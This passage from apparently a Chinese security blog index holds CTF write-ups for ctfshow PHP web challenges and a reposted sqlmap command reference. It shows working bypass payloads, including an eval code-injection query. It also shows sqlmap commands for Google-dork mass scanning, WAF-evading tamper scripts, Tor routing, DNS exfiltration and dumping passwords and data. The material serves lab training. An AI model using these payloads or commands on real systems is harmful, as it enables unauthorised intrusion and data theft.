die(\u0026#34;no no no!!!\u0026#34;); } if(intval($num,0)===4476){ echo $flag; } } php\r1 2 3 if(preg_match(\u0026#34;/[a-z]|\\./i\u0026#34;, $num)){ die(\u0026#34;no no no!!\u0026#34;); } 使用正则表达式检查 $num 是否包含字母或小数点\nplain\r1 2 3 if(!strpos($num, \u0026#34;0\u0026#34;)){ die(\u0026#34;no no no!!!\u0026#34;); } 检查 $num 中是否包含字符 \u0026ldquo;0\u0026rdquo;\n因为有strpos 函数，八进制010574无法让绕过\n而十六进制0x117c 包含字母 x，因此 preg_match 会匹配成功，无法绕过\n所以我们在前面加个+\nplain\r1 ?num=+010574 同样，加空格也可以绕过（空格是%20）\nweb96 php\r1 2 3 4 5 6 7 8 9 10 11 \u0026lt;?php highlight_file(__FILE__); if(isset($_GET[\u0026#39;u\u0026#39;])){ if($_GET[\u0026#39;u\u0026#39;]==\u0026#39;flag.php\u0026#39;){ die(\u0026#34;no no no\u0026#34;); }else{ highlight_file($_GET[\u0026#39;u\u0026#39;]); } } 如果 u 的值是 'flag.php'，会输出 \u0026quot;no no no\u0026quot; 并停止执行；\n如果 u 的值不是 'flag.php'，会尝试显示 u 参数指定的文件内容，并以语法高亮的形式展示。\n要想看到flag.php文件，可以使用文件目录操作\nplain\r1 ?u=./flag.php / 根目录\n./ 当前目录\n../ 上一个目录\nweb97 php\r1 2 3 4 5 6 7 8 9 10 11 12 \u0026lt;?php include(\u0026#34;flag.php\u0026#34;); highlight_file(__FILE__); if (isset($_POST[\u0026#39;a\u0026#39;]) and isset($_POST[\u0026#39;b\u0026#39;])) { if ($_POST[\u0026#39;a\u0026#39;] != $_POST[\u0026#39;b\u0026#39;]) if (md5($_POST[\u0026#39;a\u0026#39;]) === md5($_POST[\u0026#39;b\u0026#39;])) echo $flag; else print \u0026#39;Wrong.\u0026#39;; } ?\u0026gt; if (isset($_POST['a']) and isset($_POST['b'])) {:检查用户是否通过 POST 请求提交了两个参数 a 和 b。如果 a 和 b 都存在，则继续执行下面的代码。 if ($_POST['a'] != $_POST['b']):检查用户提交的 a 和 b 的值是否不相等。如果 a 和 b 的值不相等，则继续执行下面的代码。 if (md5($_POST['a']) === md5($_POST['b'])):计算 a 和 b 的 MD5 哈希值，并进行严格比较（===）。如果 a 和 b 的 MD5 哈希值相等，则执行 echo $flag;，输出 flag.php 否则，执行 print 'Wrong.';，输出 \u0026ldquo;Wrong.\u0026quot;。 解题思路：\n需要利用MD5处理数组时的特性。当传入数组时，md5()函数会返回null，并且当两个数组不同但MD5都为null时，严格比较（===）成立。\n所以我们构造数组：\n通过POST提交a和b作为数组，使其值不同但MD5结果均为null。 确保a不等于b，但它们的MD5哈希严格相等，从而输出flag。 plain\r1 a[]=123\u0026amp;b[]=456 这里是post传参\nweb98 php\r1 2 3 4 5 6 7 \u0026lt;?php include(\u0026#34;flag.php\u0026#34;); $_GET ? $_GET = \u0026amp;$_POST : \u0026#39;flag\u0026#39;; $_GET[\u0026#39;flag\u0026#39;] == \u0026#39;flag\u0026#39; ? $_GET = \u0026amp;$_COOKIE : \u0026#39;flag\u0026#39;; $_GET[\u0026#39;flag\u0026#39;] == \u0026#39;flag\u0026#39; ? $_GET = \u0026amp;$_SERVER : \u0026#39;flag\u0026#39;; highlight_file($_GET[\u0026#39;HTTP_FLAG\u0026#39;] == \u0026#39;flag\u0026#39; ? $flag : __FILE__); 这个代码有些变扭，用ai转化一下\nphp\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 \u0026lt;?php include(\u0026#34;flag.php\u0026#34;); // 第一次条件：如果存在 GET 参数，将 $_GET 指向 $_POST if (!empty($_GET)) { $_GET = \u0026amp;$_POST; } // 第二次条件：检查 $_GET（此时可能指向 $_POST）中的 \u0026#39;flag\u0026#39; 参数 if (isset($_GET[\u0026#39;flag\u0026#39;]) \u0026amp;\u0026amp; $_GET[\u0026#39;flag\u0026#39;] === \u0026#39;flag\u0026#39;) { $_GET = \u0026amp;$_COOKIE; } // 第三次条件：检查 $_GET（此时可能指向 $_COOKIE）中的 \u0026#39;flag\u0026#39; 参数 if (isset($_GET[\u0026#39;flag\u0026#39;]) \u0026amp;\u0026amp; $_GET[\u0026#39;flag\u0026#39;] === \u0026#39;flag\u0026#39;) { $_GET = \u0026amp;$_SERVER; } // 最终决定显示 flag 还是当前文件 $fileToHighlight = (isset($_GET[\u0026#39;HTTP_FLAG\u0026#39;]) \u0026amp;\u0026amp; $_GET[\u0026#39;HTTP_FLAG\u0026#39;] === \u0026#39;flag\u0026#39;) ? $flag : __FILE__; highlight_file($fileToHighlight); plain\r1 2 $_GET[\u0026#39;flag\u0026#39;] == \u0026#39;flag\u0026#39; ? $_GET = \u0026amp;$_COOKIE : \u0026#39;flag\u0026#39;; $_GET[\u0026#39;flag\u0026#39;] == \u0026#39;flag\u0026#39; ? $_GET = \u0026amp;$_SERVER : \u0026#39;flag\u0026#39;; 这两行代码对最后flag的输出没有影响因为最后源代码的显示主要看get参数HTTP_FLAG=flag是否成立\nplain\r1 highlight_file($_GET[\u0026#39;HTTP_FLAG\u0026#39;] == \u0026#39;flag\u0026#39; ? $flag : __FILE__); 但是我们不能直接get传参HTTP_FLAG=flag，因为如果get传参存在的话就会被post覆盖，所以我们可以get传参任意一个数（随便传但是必须有），然后再post传参HTTP_FLAG=flag覆盖get所传参数的值，便可以显示flag。\nweb100 php\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 \u0026lt;?php highlight_file(__FILE__); include(\u0026#34;ctfshow.php\u0026#34;); //flag in class ctfshow; $ctfshow = new ctfshow(); $v1 = $_GET[\u0026#39;v1\u0026#39;]; $v2 = $_GET[\u0026#39;v2\u0026#39;]; $v3 = $_GET[\u0026#39;v3\u0026#39;]; $v0 = is_numeric($v1) and is_numeric($v2) and is_numeric($v3); if ($v0) { if (!preg_match(\u0026#34;/\\;/\u0026#34;, $v2)) { if (preg_match(\u0026#34;/\\;/\u0026#34;, $v3)) { eval(\u0026#34;$v2(\u0026#39;ctfshow\u0026#39;)$v3\u0026#34;); } } } php\r1 2 3 4 5 6 7 if ($v0) { if (!preg_match(\u0026#34;/\\;/\u0026#34;, $v2)) { if (preg_match(\u0026#34;/\\;/\u0026#34;, $v3)) { eval(\u0026#34;$v2(\u0026#39;ctfshow\u0026#39;)$v3\u0026#34;); } } } 以上代码表示只有$v0=1，且v2中不能含有分号，v3要有分号\nphp\r1 $v0 = is_numeric($v1) and is_numeric($v2) and is_numeric($v3); 在这段代码中只需要v1有数字即可，因为赋值操作的优先级大于and\nphp\r1 eval(\u0026#34;$v2(\u0026#39;ctfshow\u0026#39;)$v3\u0026#34;); 这段代码会执行括号里的内容，因此我们可以利用括号中的\t$v2('ctfshow')$v3来构造可以输出flag的函数\nphp\r1 //flag in class ctfshow; 由题目中的注释可知flag在ctfshow中，因此我们只需要输出ctfshow即可\nget传参传入\nplain\r1 ?v1=1\u0026amp;v2=var_dump($ctfshow)/*\u0026amp;v3=*/; 参考资料 本篇文章参考：OWASP（开放式Web应用程序安全项目）\nhttps://owasp.org/Top10/\nOWASP（开放式Web应用程序安全项目）是一个开放的社区，由非营利组织 OWASP基金会支持的项目。对所有致力于改进应用程序安全的人士开放，旨在提高对应用程序安全性的认识。 其最具权威的就是“10项最严重的Web 应用程序安全风险列表” ，总结并更新Web应用程序中最可能、最常见、最危险的十大漏洞，是开发、测试、服务、咨询人员应知应会的知识。 最重要的版本 应用程序中最严重的十大风险 ————————————————\n资料：\n通过网盘分享的文件：OWASP代码审计指南v2.0_中文版_刘传兴\u0026amp;孙维康.pdf 链接: https://pan.baidu.com/s/19E7tec4WmZ_IVVkanf3uxQ 提取码: e86b \u0026ndash;来自百度网盘超级会员v4的分享\n十大常见web漏洞及防范 - yzloo - 博客园\n","permalink":"http://localhost:1313/xvsf/posts/web%E6%BC%8F%E6%B4%9E/","summary":"\u003ch1 id=\"初识漏洞\"\u003e初识漏洞\u003c/h1\u003e\n\u003ch2 id=\"一sql注入漏洞\"\u003e一、SQL注入漏洞\u003c/h2\u003e\n\u003cp\u003e\u003ca href=\"https://blog.csdn.net/dreamthe/article/details/124969922?spm=1001.2014.3001.5501\"\u003eSQL注入实战指南-CSDN博客\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003eSQL注入攻击（SQL Injection）\u003c/p\u003e\n\u003cp\u003eSQL注入原理：\u003c/p\u003e\n\u003cp\u003eSQL注入即是指web应用程序对用户输入数据的合法性没有判断或过滤不严，攻击者可以在web应用程序中事先定义好的查询语句的结尾上添加额外的SQL语句，在管理员不知情的情况下实现非法操作，以此来实现欺骗数据库服务器执行非授权的任意查询，从而进一步得到相应的数据信息。\u003c/p\u003e","title":"Web漏洞靶场练习(不定时更新)"},{"content":"sqlmap命令详解 转载自： 全栈程序员站长 原文：https://cloud.tencent.com/developer/article/2148285\n0x01 sqlmap 确定目标 1.1 直连数据库 sqlmap支持直接连接数据库，通过以下命令来直连\n服务型数据库（前提知道数据库用户名和密码） DBMS://USER:PASSWORD@DBMS_PORT/DATABASE_NAME （MySQL，Oracle，Microsoft SQL Server，PostgreSQL，etc）\n例如： python sqlmap.py -d “mysql://admin:admin@192.168.1.2:3306/security” -f –banner\n文件型数据库（前提知道数据库的绝对路径） DBMS://DATABASE_FILEPATH (SQLite，Microsoft Access，Fire bird，etc)\n1.2 URL探测 sqlmap直接对单一URL探测，使用参数 -u 或 –url URL格式：http(s): //targeturl [:port] /[…]\n例如： python sqlmap.py -u http://www.target/vuln.php?id=1 –banner\n1.3 文件读取目标 sqlmap支持从不同类型的文件中读取目标进行SQL注入探测 1、-l 从BurpSuite Proxy或从WebScarab Proxy中读取HTTP请求日志\n查看burpsuite抓取的日志信息\n使用sqlmap进行演示\n2、-x 从sitemap.xml站点地图文件中读取目标探测\n3、-m 从多行文本格式文件读取多个目标\n4、-r 从文本文件中读取HTTP请求作为SQL注入探测目标\n将burp suite抓取的HTTP请求信息，复制到txt文件中，在使用sqlmap -r ‘txt文件’ 进行探测\n5、-c 从配置文件 sqlmap.conf 中读取目标探测 查看sqlmap.conf 文件的内容\n将想要探测目标的url填入该文件中，里面也可以通过日志文件形式（相当于使用 -l 参数）、HTTP请求文件（相当于使用 -r 参数）进行探测，还可以设置其他参数，例如：method(HTTP请求方法)、data（指定POST提交的数据）等等\n接下来，我们将目标url填入sqlmap.conf文件，进行演示 python sqlmap.py -c sqlmap.conf –banner\n1.4 Google 批量扫描注入 sqlmap通过 -g 自动利用Google获取指定Google hack的目标，然后利用交互向导模式进行SQL注入探测\n例如： python sqlmap.py -g “inurl:.php?id=”\n0x02 sqlmap 请求参数设置（一） 2.1 设置 HTTP 方法 Sqlmap会自动在探测过程中使用适合的HTTP请求方法。但是在某些具体情况下，需要强制使用具体的HTTP请求方法。例如 PUT请求方法。HTTP PUT请求方法不会自动使用，因此需要我们强制指定。使用 –method=PUT。\n例如： python sqlmap.py -u “http://192.168.1.2/sqlilabs/Less-1/?id=1” –method=get –banner\n2.2 设置 POST 提交参数 默认情况下，用于执行HTTP请求的HTTP方法是GET，但是您可以通过提供在POST请求中发送的数据隐式地将其更改为POST。这些数据作为这些参数，被用于SQL注入检测。 例如： python sqlmap.py -u “http://www.target.com/vuln.php” –data=“id=1” -f –banner –dbs –users\n-f fingerprint 指纹\n演示： python sqlmap.py -u “http://192.168.1.2/sqlilabs/Less-11/” –data=“uname=admin\u0026amp;passwd=admin\u0026amp;submit=Submit” -p uname -f –banner\n2.3 设置参数分割符 在某些情况下，sqlmap需要覆盖默认参数分隔符(例如\u0026amp; in GET和POST数据)，才能正确地分割和单独处理每个参数。\n例如： python sqlmap.py -u “http://www.target.com/vuln.php” –data=“query=foobar;id=1” –param-del=”;” -f –banner –dbs –users\n演示： python sqlmap.py -u “http://192.168.1.2/sqlilabs/Less-11/” –data=uname=“admin\u0026amp;passwd=admin\u0026amp;submit=Submit” –param-del=”\u0026amp;” -p uname -f –banner\n2.4 设置Cookie 头 Sqlmap中用来设置Cookie的参数：–cookie, –cookie-del, –load-cookies –drop-set-cookie\n使用场景： 1、Web应用程序具有基于Cookie验证的过程； 2、想利用Cookie值上的SQL注入漏洞。\nSqlmap使用Cookie过程： 1、登录或浏览页面。 2、打开审计工具或代理截断，复制Cookie。 3、在Sqlmap中使用 –cookie 粘贴Cookie。\npython sqlmap.py -u “http://192.168.1.2/sqlilabs/Less-11/” –data=“uname=admin\u0026amp;passwd=admin\u0026amp;submit=Submit” -p uname -f –banner\n如果在通信过程中，web应用程序使用Set-Cookie标头进行响应，sqlmap将在所有进一步的HTTP请求中自动使用其值作为Cookie标头。sqlmap还将为SQL注入自动测试这些值。这可以通过提供–drop-set-cookie—sqlmap将忽略任何即将到来的Set-Cookie头来避免。 反之亦然，如果您提供了一个带有选项的HTTP Cookie报头—Cookie和目标URL在任何时候发送一个HTTP set -Cookie报头，sqlmap将询问您要为以下HTTP请求使用哪组Cookie。\nload-cookie，可以用来提供包含Netscape/wget格式的cookie的特殊文件\n注意：如果需要对HTTP Cookie值进行SQL注入探测，需要设置 –level 2以上（3）。\n2.5 设置 User-Agent 头 默认情况下， sqlmap使用以下用户代理头值执行HTTP请求: sqlmap/1.0-dev-xxxxxxx (http://sqlmap.org) （使用Wireshark 抓包查看）\n然而， 通过提供自定义用户代理作为选项的参数， 可以使用选项—user-agent来伪造它。（可使用burpsuite抓取正常的HTTP请求包获取User-Agent头的信息）\nsqlmap -u “http://192.168.1.2/sqlilabs/Less-1/?id=1” –user-agent ” Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:77.0) Gecko/20100101 Firefox/77.0″ 再次抓包查看\n此外， 通过 –random-agent, sqlmap将从./txt/user-agent中随机选择一个用于会话中的所有HTTP请求。一些站点在服务端检测HTTP User-Agent值， 如果不是一个合法的值， 就会中断连接。 同时Sqlmap也会曝出错误。\n演示： sqlmap -u “http://192.168.1.2/sqlilabs/Less-1/?id=1” –random-agent 抓包查看\n注意针对User-Agent的值探测SQL注入， 需要设置–level 值为3。或者，使用Burp Suite抓包，将HTTP请求信息复制到txt文件中，然后在要User-Agent头的后面加上一个 * 号，这样不使用—level 3 也能够对User-Agent头进行探测\n2.6 设置 Host 头 可以手动设置HTTP主机头值。 默认情况下， 从提供的目标URL解析HTTP主机头\n注意， 如果 –level设置为5,将对HTTP主机头进行SQL注入检测。\n2.7 设置 Referer 头 伪造HTTP Referer值是可能的。 默认情况下， 如果没有显式设置， HTTP请求中不会发送HTTP引用头。 请注意， 如果–level设置为3或以上， 将针对HTTP引用头 进行SQL注入测试（或在请求信息中要进行探测的位置后面加上*号）\n2.8 设置 额外 HTTP 头 通过设置选项–header， 可以提供额外的HTTP标头。 每个标头必须用换行符（\\n）分隔， 从配置INI文件中提供它们要容易得多。 可以查看示例sqlmap.conf文件。\n例如： python sqlmap.py -u “http://192.168.21.128/sqlmap/mysql/get_int.php?id=1” –headers=“Host:www.target.com\\nUser-agent:Firefox 1.0” -v 5\n以Sqli-Labs靶场的Sqli-Less1为例 将User-Agent设为：haha 将cookie设为:heihei\nsqlmap -u “http://192.168.1.2/sqlilabs/Less-1/?id=1” –headers=“user-agent:haha\\ncookie:heihei”\n2.9 设置 HTTP 协议认证 Sqlmap中设置HTTP协议认证的参数： –auth-type和–auth-cred\n其中–auth-type支持 Basic、 Digest、 NTLM\n–auth-cred认证语法为： username:password （用于需要账号密码登录的页面）\n例如： python sqlmap.py -u “http://url/arit.php?id=1” –auth-type Basic –auth-cred “testuser:testpass”\n2.10 设置 HTTP 代理 Sqlmap中设置代理的参数： –proxy, –proxy-cred, –proxy-file ， –ignore-proxy\n其中–proxy用来设置HTTP代理服务器位置 格式： –proxy http(s): //ip[:端口]\n–proxy-cred用来设置HTTP代理服务器认证信息 格式： –proxy-cred username:password\n–proxy-file用来设置多条代理在文件中\n–ignore-proxy当您希望通过忽略系统范围内的HTTP(S)代理服务器设置来针对本地网络的目标部分运行sqlmap时， 应该使用这种方法。\n0x03 sqlmap 请求参数设置（二） 3.1 设置Tor隐藏网络 Sqlmap中设置Tor网络的参数： –tor –tor-port –tor-type（共有四种类型：HTTP、HTTPS、SOCKS4、SOCKS5） –check-tor\n3.2 设置延时 Sqlmap探测过程中会发送大量探测Payload到目标， 如果默认情况过快的发包速度回导致目标预警或断开连接。 为了避免这样的情况发生， 可以在探测设置Sqlm1ap发包延迟。 默认情况下， 不设置延迟。 –delay 0.5 设置延迟0.5秒\n3.3 设置超时 在考虑超时HTTP(S)请求之前， 可以指定等待的秒数。 有效值是一个浮点数， 例如10.5表示10秒半。 默认设置为30秒。 例如： –timeout 10.5\n3.4 设置重传次数 –retries count 设置对应重试次数， 默认情况下重试3次。（通常与超时参数结合使用）\n3.5 设置随机化参数 Sqlmap可以指定要在每次请求期间随机更改其值的参数名称。 长度和类型根据提供的原始值保持一直。 –randomize 参数名称\n例如：\n3.6 设置日志过滤目标 与使用选项-l使用从提供的日志解析的所有主机不同， 您可以指定有效的Python正则表达式， 用于过滤所需的日志。\n例如： python sqlmap.py -l burp.log –scope=”(www)?.target.(com|net|org)”\n–scope= ” 正则表达式 “\n3.7 设置忽略 401 –ignore-401 参数用来忽略未验证错误。\n如果您想测试偶尔返回HTTP错误401(未经授权的)的站点，而您想忽略它并在不提供适当凭证的情况下继续测试，您可以使用–ignore-401\n3.8 设置 HTTP 协议私钥 当web服务器需要适当的客户端证书和用于身份验证的私钥时，应该使用此选项。提供的值应该是一个PEM格式的key_file，其中包含证书和私钥。\n–auth-file 文件名\n3.9 设置安全模式 避免在多次请求失败后销毁会话\n有时，如果执行了一定数量的不成功请求，则在此期间的web应用程序或检查技术会销毁会话。这可能发生在sqlmap的检测阶段或利用任何盲SQL注入类型时。原因是SQL有效负载不一定返回输出，因此可能会向应用程序会话管理或检查技术发出信号。\n–safe-url, –safe-post, –safe-req –safe-freq\n通过这种方式，sqlmap将访问每个预定义数量的请求，而不对某个安全URL执行任何类型的注入。\n3.10 设置忽略URL编码 据参数的位置(例如GET)，默认情况下它的值可以是URL编码的。在某些情况下，后端web服务器不遵循RFC标准，需要以原始的非编码形式发送值。在这种情况下使用–skip-urlencode。\n–skip-urlencode 不进行URL加密\n0x04 sqlmap 性能优化 4.1 设置持久 HTTP 连接 Sqlmap中可以设置连接为持久连接。 HTTP报文中设置 Connection: Keep-Alive。（通过减少连接次数来提升性能） 参数： –keep-alive 注意该参数与 -proxy参数不兼容\n4.2 设置 HTTP 空连接 Sqlmap中设置空连接， 表示直接获得HTTP响应的大小而不用获得HTTP响应体。 常用在盲注判断真/假中，降低网络带宽消耗。 参数： –null-connection 注意这个参数，与–text-only参数不兼容\n4.3 设置多线程 Sqlmap中设置同时发送多少个HTTP请求的多线程。\n–threads 默认是1个线程。 为了不影响目标站点服务器的性能， Sqlmap可以设置最大的线程数为10。\n4.5 设置预测输出 Sqlmap中的预测输出， 在推理算法中用于检索值字符的顺序统计预测。 参数： –predict-output\n注意这个参数与 –thread参数不兼容。\n使用 -o 参数可开启前面三个性能参数（–keep-alive 、–null-connection 、 –predict-output），不开启 –threads参数\n0x05 sqlmap 注入位置介绍 5.0 注入介绍 所谓SQL注入， 就是通过把SQL命令插入到Web表单提交或输入域名或页面请求的查询字符串， 最终达到欺骗服务器执行恶意的SQL命令。 具体来说， 它是利用现有应用程序， 将（恶意的） SQL命令注入到后台数据库引擎执行的能力， 它可以通过在Web表单中输入（恶意） SQL语句得到一个存在安全漏洞的网站上的数据库， 而不是按照设计者意图去执行SQL语句。\n由此可见： SQL注入发生位置 HTTP数据包中任意位置\n5.1 设置指定注入参数 Sqlmap测试参数 -p, –skip –param-exclude –skip-static\n-p ： 指定具体探测的参数。 例如： -p “id,user-agent”\n–skip： 忽略探测具体的参数。 例如： –level –skip “user-agent,referer”\n–param-exclude： 忽略包含具体内容的参数。 例如： –param-exclude=“token|session” 不对包含token或session的参数进行探测。\n–skip-static： 忽略非动态参数\n5.2 设置URL注入位置 当注入点位于URL本身内部时， 会出现一些特殊情况。 除非手动指向URL路径， 否则sqlmap不会对URL路径执行任何自动测试。 必须在命令行中添加星号(*)来指定这些注入点。\n例如， 当使用Apache web服务器的mod_rewrite模块或其他类似的技术时， 这就显得特别有用了\npython sqlmap.py -u http://targeturl/param1/value1*/param2/value2/\n5.3 设置任意注入位置 与URL注入点类似， 星号(*)(注意:这里也支持Havij样式%INJECT %)也可以用来指向GET、POST或HTTP头中的任意注入点。 注入点可以通过在带有选项-u的GET参数值、 带有选项–data数据的POST参数值、 带有选项-H的HTTP（header）头值、 带有选项-A的User_Agent头、 用户代理、 引用和/或cookie的HTTP头值中指定， 或者在带有选项-r的文件中加载的HTTP请求的通用位置指定。\npython sqlmap.py -u “http://targeturl” –cookie=”param1=value1*;param2=value2\n0x06 sqlmap 注入参数 6.1 强制设置 DBMS 默认情况下Sqlmap会自动识别探测目标Web应用程序的后端数据库管理系统（DBMS） ， 以下列出\nSqlmap完全支持的DBMS种类：\nMysql、 Oracle、 Microsoft SQL Server、 IBM DB2、 SQLite、 Firebird、 Sybase、 SAP MaxDB、HSQLDB、 Informix\n–dbms 数据库管理系统名称 [版本号]\n例如： –dbms mysql 5.0 、 –dbms microsoft sql server 05\n6.2 强制设置 OS 默认情况下Sqlmap会自动识别探测目标Web应用程序的后端操作系统（OS） ， 以下列出Sqlmap完全支持的OS种类。 Linux 、 Windows\n请注意， 此选项不是强制性的， 强烈建议只在完全确定底层操作系统的后端数据库管理系统时才使用它。 如果不知道它， 让sqlmap自动为您识别它。 例如： –os windows 或 –os linux\n请注意， 此选项不是强制性的， 强烈建议只在完全确定底层操作系统的后端数据库管理系统时才使用它。 如果不知道它， 让sqlmap自动为您识别它。\n6.3 关闭负载转换机制 在检索结果时， sqlmap使用一种机制， 在这种机制中， 所有条目都被转换为字符串类型， 并在NULL值的情况下用空格字符替换。 这样做是为了防止出现任何错误状态(例如， 将空值与字符串值连接起来)， 并简化数据检索过程本身。 尽管如此， 还是有报告的案例(例如MySQL DBMS的旧版本)由于数据检索本身的问题(例如没有返回值)需要关闭这种机制(使用此开关)。\n–no-cast\n6.4 关闭字符转义机制 在sqlmap需要在有效负载中使用(单引号分隔)字符串值(例如， 选择’foobar’)时， 这些值将自动转义(例如， 选择CHAR(102)+CHAR(111)+CHAR(111)+CHAR(98)+CHAR(97)+CHAR(114))。这样做的原因有两个:混淆有效负载内容和防止后端服务器上查询转义机制(例如magic_quotes和/或mysql_real_escape_string)的潜在问题。 用户可以使用这个开关关闭它(例如减少有效负载大小)。\n–no-escape（一般不建议关闭）\n6.5 强制设置无效值替换 在sqlmap需要使原始参数值无效(例如id=13)时，它使用经典的否定(例如id=-13)。有了这个开关，就可以强制使用大整数值来实现相同的目标(例如id=99999999)。 –invalid-bignum\n在sqlmap需要使原始参数值无效(例如id=13)时，它使用经典的否定(例如id=-13)。有了这个开关，就可以强制使用布尔操作来实现相同的目标(例如id=13 and18=19)。 –invalid-logical\n在sqlmap需要使原始参数值无效(例如id=13)时，它使用经典的否定(例如id=-13)。有了这个开关，就可以强制使用随机字符串来实现相同的目标(例如id=akewmc)。 –invalid-string\n6.6 自定义注入负载位置 在某些情况下，只有当用户提供要附加到注入负载的特定后缀时，易受攻击的参数才可被利用。当用户已经知道查询语法并希望通过直接提供注入有效负载前缀和后缀来检测和利用SQL注入时，这些选项就派上用场了。 –prefix 设置SQL注入Payload前缀 –suffix 设置SQL注入Payload后缀\n例如： SQL查询语句为：\njavascript\r1 $query = \u0026#34;SELECT * FROM users WHERE id=(\u0026#39; . $_GET[\u0026#39;id\u0026#39;] . \u0026#39;) LIMIT 0, 1\u0026#34;; sqlmap参数使用： python sqlmap.py -u “http://ip/sqlmap/mysql/get_str_brackets.php ?id=1” -p id –prefix “’)” –suffix “AND (‘abc’=’abc”\n插入Payload后的SQL查询语句：\njavascript\r1 $query = \u0026#34;SELECT * FROM users WHERE id=(\u0026#39;1\u0026#39;) \u0026lt;PAYLOAD\u0026gt; AND (\u0026#39;abc\u0026#39;=\u0026#39;abc\u0026#39;) LIMIT 0, 1\u0026#34;; 6.7 设置 Tamper 脚本 sqlmap本身不会混淆发送的有效负载，除了单引号之间的字符串被CHAR()类似的表示形式所取代之外。sqlmap通过Tamper脚本来绕过WAF等防御措施，可以在tamper文件夹下找到所有sqlmap自带的tamper脚本。\nsqlmap.py -u “http://ip/sqlmap/mysql/get_int.php?id=1” –tamper“between.py,randomcase.py,space2comment.py” -v 3\n6.8 设置 DBMS 认证 设置DBMS认证方式通过以下命令：\n–dbms-cred = username:password\n0x07 sqlmap 自定义检测参数 7.1 设置探测等级 –level 此选项需要指定要执行的测试等级的参数。有五个层次。在执行有限数量的测试(请求)时，默认值为1。1~5探测复杂逐步提升。\nsqlmap使用的有效负载在文本文件xml/payload .xml中指定。按照文件顶部的说明，如果sqlmap错过了注入，您也应该能够添加自己的有效负载来进行测试!\n这个选项不仅会影响到哪个有效负载sqlmap尝试，还会影响到在考试中取哪个注入点:GET和POST参数总是被测试，HTTP Cookie头值从第2级测试，HTTP用户代理/引用头值从第3级测试。\n总之，检测SQL注入越困难，必须设置的——级别就越高。 在显示无法注入时，可以设置 –level 5 来进行更强大的探测\n7.2 设置风险参数 此选项需要指定要执行测试的风险的参数。有三个风险值。默认值为1，这对于大多数SQL注入点来说是无害的。风险值2增加了大量基于查询时间的SQL注入测试的默认级别，值3也增加了基于or的SQL注入测试。\n在某些情况下，比如UPDATE语句中的SQL注入，注入基于or的有效负载可能导致表的所有条目的更新，这肯定不是攻击者想要的。出于这个原因和其他原因，我们引入了这个选项:用户可以控制测试的有效负载，用户可以任意选择使用也有潜在危险的负载。\n例如： –risk num num范围 1~3\n7.3 设置页面比较参数 默认情况下，通过比较注入的请求页面内容和未注入的原始页面内容，可以区分真查询和假查询。这种观念并不总是起作用是因为在每次刷新页面内容的变化有时甚至没有注射,例如当页面有一个计数器,一个动态广告横幅或任何其他HTML的一部分呈现动态和可能改变时间不仅因此用户的输入。为了绕过这个限制，sqlmap努力识别响应体的这些片段并进行相应处理。\n–string：指定包含字符串 查询为True –not-string：指定包含字符串 查询为False –regexp：指定通过正则表达式匹配字符串,查询为True –code：指定匹配HTTP状态响应码，查询为True\n7.4 设置内容比较参数 –text-only：设置页面内容中包含文本。\n例如：–text-only = “Welcome for True and Forbidden for False”\n–titles：设置页面title中包含文本。前提需要知道如何区分查询的真与假，根据返回字符串内容不同。 –titles=”Login”\n0x08 sqlmap 注入技术参数 8.1 设置具体 SQL 注入技术 –technique 参数用来设置具体SQL注入技术。以下列出Sqlmap支持的SQL注入技术。\nB: Boolean-based blind 基于布尔的盲注 E: Error-based 报错注入 U: Union query-based Union查询注入 S: Stacked queries 堆叠注入 T: Time-based blind 基于时间的盲注 Q: Inline queries 内联查询注入\n例如：sqlmap -u “存在注入点的URL” –technique B –current-db 利用基于布尔的盲注对注入点进行SQL注入探测\n8.2 设置时间盲注延迟时间 在测试基于时间的盲SQL注入时，可以设置秒来延迟响应，方法是提供–time-sec选项，后面跟着一个整数。默认情况下，它的值设置为5秒。\n例如： sqlmap -u “存在注入点的URL” –time-sec 3 –current-db\n8.3 设置 UNION 字段数 默认情况下，sqlmap测试使用1到10列的UNION查询SQL注入技术。但是，通过提供更高–level值，可以将此范围增加到50列。\n您可以手动告诉sqlmap使用特定范围的列来测试这种类型的SQL注入，方法是为该工具提供选–union-cols后跟一系列整数。例如，12-16表示使用12到16个列对UNION查询SQL注入进行测试。\n例如：sqlmap -u “存在注入的URL” –union-cols 12-18 –current-db\n8.4 设置 UNION 字符 默认情况下，sqlmap测试使用空字符的联合查询SQL注入技术。但是，通过提供更高级别的值sqlmap，还将使用随机数执行测试，因为在某些情况下，UNION查询测试使用NULL会失败，而使用随机整数则会成功。\n您可以手动告诉sqlmap使用特定字符测试这种类型的SQL注入，方法是使用带有所需字符值的选项–union-char(例如–union-char 123)。\n8.5 设置 UNION 查询表 某些情况下，Sqlmap需要设定Union 查询SQL注入的具体数据表才可以得到数据。 –union-from 表名\n8.6 设置 DNS 露出攻击 针对目标网络很有可能对外部流量进行限制，或者设置WAF。\n通过设置DNS流量来突破限制 –dns-domain “dns服务器” 需要用户自身具有一个开放53端口的DNS服务器，通过DNS流量来获得Web应用程序中数据内容。\n8.7 设置二次注入 Sqlmap中可以设置二次注入的结果页面。 –second-url URL\n8.8 识别指纹 –fingerprint -f 探测目标指纹信息。\n0x09 sqlmap 检索 DBMS 信息 9.1 检索 DBMS Banner 信息 获取后端数据库Banner信息。 –banner或者 -b\n9.2 检索 DBMS 当前用户 获取DBMS当前用户 –current-user\n9.3 检索 DBMS 当前数据库 获取当前数据库名。 –current-db\n9.4 检索 DBMS 当前主机名 –hostname\n0x0A sqlmap 枚举 DBMS 信息 10.1 探测当前用户 DBA –is-dba 探测当前用户是否是数据库管理员。\n若返回True，则说明当前用户是数据库管理员\n10.2 枚举 DBMS 用户 获取DBMS所有用户 –users\n10.3 枚举 DBMS 用户密码 –password 获取用户密码\n10.4 枚举 DBMS 权限 –privileges –role(角色)\n10.5 枚举数据库名 –dbs 列举数据库名称\n10.6 枚举数据库表 –tables 枚举表名 –\u0026gt; 指定具体数据库 -D 数据库名 –exclude-sysdbs 只列出用户自己新建的数据库和表\n（排除DBMS系统数据库，当枚举表时）\n10.7 枚举数据库表的列名 –columns -D指定数据库 -T指定数据表 -C指定具体字段\n10.8 枚举数据值 –dump\n0x0B sqlmap 枚举信息 11.1 枚举 schema 信息 用户可以使用此开关–schema检索DBMS模式。模式列表将包含所有数据库、表和列，以及它们各自的类型。与–exclude-sysdb结合使用时，只会检索和显示包含非系统数据库的模式的一部分。\npython sqlmap.py -u 